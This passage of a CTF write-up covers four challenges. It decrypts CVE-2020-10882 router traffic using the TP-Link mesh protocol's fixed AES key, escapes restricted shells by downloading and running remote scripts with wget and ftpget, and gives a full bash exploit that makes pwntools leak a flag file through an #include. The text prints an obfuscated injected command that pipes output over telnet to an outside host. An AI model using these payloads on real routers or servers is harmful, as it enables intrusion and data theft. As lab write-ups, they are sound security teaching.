</code></pre><h2 class="relative group">AC1750<div id=ac1750 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#ac1750 aria-label=Anchor>#</a></span></h2><blockquote><p>My router is weird, can you help me find the problem?</p></blockquote><h3 class="relative group">The challenge<div id=the-challenge-2 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#the-challenge-2 aria-label=Anchor>#</a></span></h3><p>We are given a PCAP file which contains some communication between a computer (a macbook pro) and a router (a TP-link AC1750)</p><h3 class="relative group">The PCAP<div id=the-pcap class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#the-pcap aria-label=Anchor>#</a></span></h3><p>The PCAP can be divided into 3 main flows, one after the other:</p><ol><li>Some HTTP requests to the router web interface, which seems to be running
some sort of OpenWRT, given the references to the LuCI API. Nothing too
interesting here</li><li>Some weird UDP traffic from the computer to port 20002 of the router which
appears to be encrypted (high entropy, no recognizable strings)</li><li>A TCP connection from the router to the computer on port 4321, which sends
back the output of the <code>ls</code> command</li></ol><h3 class="relative group">UDP port 20002<div id=udp-port-20002 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#udp-port-20002 aria-label=Anchor>#</a></span></h3><p>From a quick search on the internet, we find references to
<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10882" target=_blank>CVE-2020-10882</a>,
which coincidentally affects the router we are communicating with.</p><p>We were able to find
<a href=https://www.thezdi.com/blog/2020/4/6/exploiting-the-tp-link-archer-c7-at-pwn2own-tokyo target=_blank>this extremely useful writeup</a>
which explains the details of the protocol, and of the vulnerability which
causes RCE. TLDR (since it&rsquo;s what we care about): it communicates using packets
containing a 32-byte header and a JSON encrypted with AES-128 CBC, with the
fixed key <code>TPONEMESH_Kf!xn?</code> and IV <code>1234567890abcdef1234567890abcdef</code>.</p><p>Without knowing anything else about the protocol (except that the injection
point is in the slave_mac JSON key), we exported the UDP traffic from wireshark
as JSON and wrote this quick python script:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>AES</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>decrypt</span><span class=p>(</span><span class=n>packet_hex</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>c</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;TPONEMESH_Kf!xn?&#39;</span><span class=p>,</span><span class=n>AES</span><span class=o>.</span><span class=n>MODE_CBC</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;1234567890abcdef&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>enc</span> <span class=o>=</span> <span class=nb>bytearray</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>packet_hex</span><span class=p>[</span><span class=mi>32</span><span class=p>:])</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=n>c</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>enc</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>json</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>f</span> <span class=o>=</span> <span class=n>json</span><span class=o>.</span><span class=n>loads</span><span class=p>(</span><span class=nb>open</span><span class=p>(</span><span class=s2>&#34;traffic.json&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>p</span> <span class=ow>in</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>	<span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>		<span class=n>p</span> <span class=o>=</span> <span class=n>p</span><span class=p>[</span><span class=s1>&#39;_source&#39;</span><span class=p>][</span><span class=s1>&#39;layers&#39;</span><span class=p>][</span><span class=s1>&#39;udp&#39;</span><span class=p>][</span><span class=s1>&#39;udp.payload&#39;</span><span class=p>]</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span><span class=s2>&#34;&#34;</span><span class=p>)</span> <span class=c1>#because wireshark hexdump is stupid</span>
</span></span><span class=line><span class=cl>		<span class=nb>print</span><span class=p>(</span><span class=n>json</span><span class=o>.</span><span class=n>loads</span><span class=p>(</span><span class=n>decrypt</span><span class=p>(</span><span class=n>p</span><span class=p>))[</span><span class=s1>&#39;data&#39;</span><span class=p>][</span><span class=s1>&#39;slave_mac&#39;</span><span class=p>][</span><span class=mi>2</span><span class=p>:</span><span class=o>-</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>	<span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>		<span class=k>pass</span>
</span></span></code></pre></div><p>Which, after a bit of cleaning, this returned</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>echo&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;(&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;l&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;s&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39; &#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;-&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;l&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;&amp;&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;&amp;&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;e&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;c&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;h&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;o&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39; &#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;h&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;i&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;t&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;c&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;o&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;n&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;{&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;W&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;h&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;y&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;_&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;c&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;a&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;n&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;_&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;o&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;n&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;e&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;_&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;p&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;l&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;a&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;c&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;e&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;_&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;b&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;e&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;_&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;i&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;n&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;j&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;e&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;c&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;t&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;e&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;d&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;_&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;t&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;w&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;i&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;c&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;e&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;}&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;&gt;&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;f&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;l&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;a&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;g&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;&amp;&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;&amp;&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;l&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;s&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39; &#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;-&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;l&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;)&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;|&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;t&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;e&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;l&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;n&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;e&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;t&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39; &#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;1&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;9&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;2&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;.&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;1&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;6&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;8&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;.&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;0&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;.&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;1&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;0&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;5&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39; &#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;4&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;3&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;2&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;1&#39;</span>&gt;&gt;f<span class=p>;</span>
</span></span><span class=line><span class=cl>sh f<span class=p>;</span>
</span></span></code></pre></div><p>Which, when executed, creates the file <code>f</code> containining:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>ls -l <span class=o>&amp;&amp;</span> <span class=nb>echo</span> hitcon<span class=o>{</span>Why_can_one_place_be_injected_twice<span class=o>}</span>&gt;flag <span class=o>&amp;&amp;</span>l s -l<span class=o>)</span><span class=p>|</span>telnet 192.168.0.105 <span class=m>4321</span>
</span></span></code></pre></div><p>Which contains the flag!</p><h2 class="relative group">Baby Shock<div id=baby-shock class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#baby-shock aria-label=Anchor>#</a></span></h2><blockquote><p><code>nc 54.248.135.16 1986</code></p></blockquote><h3 class="relative group">The challenge<div id=the-challenge-3 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#the-challenge-3 aria-label=Anchor>#</a></span></h3><p>We can connect via netcat to a machine, which contains an extremely limited shell, where the only commands we can run are <code>pwd ls mkdir netstat sort printf exit help id mount df du find history touch </code>and (most of the) special characters are filtered</p><h3 class="relative group">The solution<div id=the-solution-2 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#the-solution-2 aria-label=Anchor>#</a></span></h3><p>For some reason, <code>;</code> is not filtered. This means that we can run any command by
doing <code>id ; mycommand</code>, as long as mycommand does not contain special characters
(such as <code>-</code>, so most flags are forbidden).</p><p>Also, the <code>.</code> is restricted, and cannot appear more than once in a command.</p><p>So first we execute:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>id <span class=p>;</span> wget <span class=m>123456789</span>
</span></span></code></pre></div><p>where 123456789 is the IP (encoded as decimal number) of a HTTP serve we
control, that hosts an index.html containing shell commands.</p><p>We then execute it via the command:</p><pre tabindex=0><code>id ; sh index.html
</code></pre><p>Which allows us to explore the filesystem, and see that there is a <code>readFlag</code>
binary in <code>/</code>. By executing it we get the flag.</p><h2 class="relative group">Revenge of Baby Shock<div id=revenge-of-baby-shock class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#revenge-of-baby-shock aria-label=Anchor>#</a></span></h2><blockquote><p><code>nc 18.178.60.6 1987</code></p></blockquote><h3 class="relative group">The challenge<div id=the-challenge-4 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#the-challenge-4 aria-label=Anchor>#</a></span></h3><p>It&rsquo;s identical to baby shock, but more characters are forbidden, including <code>;</code>
and even a single <code>.</code></p><h3 class="relative group">The solution<div id=the-solution-3 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#the-solution-3 aria-label=Anchor>#</a></span></h3><p>One of the (very few) special characters allowed are <code>()</code>. With these, it&rsquo;s
possible to declare functions.</p><p>This means that we can do</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; id <span class=o>()</span> whoami
</span></span><span class=line><span class=cl>&gt; id
</span></span><span class=line><span class=cl>whoami: unknown uid <span class=m>1129</span>
</span></span></code></pre></div><p>To redefine one of the allowed commands (in this case <code>id</code>) to a function that
executes our desired command.</p><p>Without the <code>.</code>, we couldn&rsquo;t use the same trick as before to execute the reverse
shell, as wget by default saves the downloaded files as <code>index.html</code> (and to
change that name, a flag starting with <code>-</code> is required).</p><p>Luckily, the server was running busybox, which contains the <code>ftpget</code> utility,
with the much simper syntax of <code>ftpget HOST LOCAL_FILE REMOTE_FILE</code>.</p><p>So we run the following commands</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>id <span class=o>()</span> ftpget <span class=m>123456789</span> payload payload
</span></span><span class=line><span class=cl>id
</span></span></code></pre></div><p>to download via FTP the payload file from our server with ip 123456789 (decimal
encoded), which contains the command <code>/readFlag</code>, and then</p><pre tabindex=0><code>id () sh payload
id
</code></pre><p>To execute it and read the flag, which is
<code>hitcon{r3v3ng3_f0r_semic010n_4nd_th4nks}</code>.</p><h2 class="relative group">Revenge of Pwn<div id=revenge-of-pwn class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#revenge-of-pwn aria-label=Anchor>#</a></span></h2><blockquote><p>Have you ever thought those challenges you pwned may retaliate someday?</p><p><code>nc 3.115.58.219 9427</code></p></blockquote><h3 class="relative group">The challenge<div id=the-challenge-5 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#the-challenge-5 aria-label=Anchor>#</a></span></h3><p>Our task is to write an exploit to &ldquo;pwn&rdquo; a
<a href=https://github.com/Gallopsled/pwntools target=_blank><code>pwntools</code></a> Python script that runs on
the remtoe server. When we connect, we can upload an executable: this executable
is then saved and exposed in the local server on port 1337. Then, the Python
script is started and connects to it. Our executable does not have the right to
read the flag, which is at <code>/home/deploy/flag</code>, but the Python script does. We
need to find a way to make it read and spit out that file.</p><p>The Python script does the following:</p><ol><li>Start listening on port 31337.</li><li>Expect to receive a string containing a stack address
(<code>stack address @ 0xXXX</code>) from the program right away.</li><li>Prepare and send a shellcode to the program. The shellcode is meant to leak
an <code>fd</code> number from the stack and send it back as a decimal string to the
Python script by conencting back to port 31337. The code sends the <code>fd</code>
number followed by a <code>@</code> character.</li><li>Receive the leaked <code>fd</code> on port 31337, using <code>s.recvuntil('@')</code>.</li><li>Use the value to craft some more shellcode which is then sent to our program.</li></ol><h3 class="relative group">The vulnerability<div id=the-vulnerability-2 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#the-vulnerability-2 aria-label=Anchor>#</a></span></h3><p>When receiving the <code>fd</code> number, the Python script treats it as a string without
converting it to integer. When passing the string to the <code>shellcraft</code> function
of <code>pwntools</code>, this value is directly inserted into an assembly program that is
then passed to <code>cpp</code> (compiler) to evaluate preprocessor macros and then to <code>as</code>
(assembler) to assemble it into the actual shellcode.</p><p>Since we have control on the &ldquo;vulnerable&rdquo; program that the script tries to
connect to, after sending a fake stack address, we can just connect back to the
script on port 31337 and send an arbitrary string followed by <code>@</code>. This string
will then be passed to <code>shellcraft</code>, and it ends up in the middle of the
assembly program that is being compiled into shellcode.</p><h3 class="relative group">The exploit<div id=the-exploit-2 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#the-exploit-2 aria-label=Anchor>#</a></span></h3><p>The remote server says &ldquo;<code>ELF size? (MAX: 6144)</code>&rdquo; when connecting, which makes it
seems like it only accepts an ELF file. Sure, we could craft a very simple ELF
that does a write plus connect, no big deal. However, as it turns out, no check
is made on the server side on the kind of file received, so we can send any kind
of file and the serer will mark it as executable and run it. We can therefore
simply send a Bash script as executable and make our life 10 times easier.</p><p>Now in our executable we could just send <code>.incbin "/home/deploy/flag"</code> and have
<code>as</code> include the flag as raw bytes in the resulting shellcode that is then sent
back to us, but <code>pwntools</code>
<a href=https://github.com/Gallopsled/pwntools/blob/stable/pwnlib/util/safeeval.py#L46 target=_blank>makes some very strict sanity checks</a>
on our string before actually inserting it into the assembly. Our string can
only be a valid Python expression: it is compiled using
<a href=https://docs.python.org/3/library/functions.html#compile target=_blank><code>compile()</code></a> and the
resulting bytecode is checked against a whitelist of Python opcodes before being
evaluated and inserted in the assembly. Long story short, we nee to pass this
check and cannot just send arbitrary stuff.</p><p>Since the assembly will be parsed by <code>cpp</code>, it can contain valid C preprocessor
directives, like for example <code>#include</code>. Luckily, <code>#</code> in Python delimits the
start of a comment, which is completely ignored by <code>compile()</code>. We can therefore
send a number followed by a newline and then <code>#include &lt;/home/deploy/flag>@</code>.</p><p>Here&rsquo;s the complete exploit:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=c1># @mebeim - 2020-11-29</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>{</span>
</span></span><span class=line><span class=cl>cat <span class=s>&lt;&lt;EOF
</span></span></span><span class=line><span class=cl><span class=s>122
</span></span></span><span class=line><span class=cl><span class=s>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=s>
</span></span></span><span class=line><span class=cl><span class=s>echo &#39;stack address @ 0x1234&#39;
</span></span></span><span class=line><span class=cl><span class=s>sleep 1
</span></span></span><span class=line><span class=cl><span class=s>echo -e &#39;123\n#include &#34;/home/deploy/flag&#34;@&#39; &gt; /dev/tcp/127.0.0.1/31337
</span></span></span><span class=line><span class=cl><span class=s>EOF</span>
</span></span><span class=line><span class=cl><span class=o>}</span> <span class=p>|</span> nc 3.115.58.219 <span class=m>9427</span>
</span></span></code></pre></div><p>This will result in the remote <code>pwntools</code> trying to compile something like this:</p><pre tabindex=0><code>    push 123
#include &lt;/home/deploy/flag&gt;
    push 16384
</code></pre><p>Which will make <code>cpp</code> include the flag in the file. Afterwards, when passing the
file to <code>as</code>, it will die because the source is invalid, and make <code>pwntools</code>
dump the script and the flag to <code>stderr</code>:</p><pre tabindex=0><code>[ERROR] An error occurred while assembling:
       1: .section .shellcode,&#34;awx&#34;
       2: .global _start
       3: .global __start
       4: _start:
       5: __start:
       6: .intel_syntax noprefix
       7: stager_3:
       8:     push 123
       9: hitcon{use_pwntools_to_pwn_pwntools_^ovo^}
      10:     push 16384
...
...
/var/tmp/pwn-asm-bslk3jq9/step1:9: Error: no such instruction: `hitcon{use_pwntools_to_pwn_pwntools_^ovo^}&#39;
